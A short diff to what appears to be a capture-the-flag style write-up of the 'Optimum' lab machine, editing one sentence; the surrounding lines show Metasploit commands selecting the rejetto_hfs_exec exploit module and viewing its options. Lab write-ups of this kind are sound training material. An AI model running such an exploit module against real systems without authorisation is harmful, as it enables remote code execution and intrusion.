@@ -58,7 +58,7 @@ I used the `exploit/windows/http/rejetto_hfs_exec`as the exploit.
 msf > use exploit/windows/http/rejetto_hfs_exec
 ```
 
-Setting the RHOST to the IP address of the Optimum.
+Setting the RHOST to the IP address of the Optimum and running the exploit.
 
 ```
 msf exploit(rejetto_hfs_exec) > show options
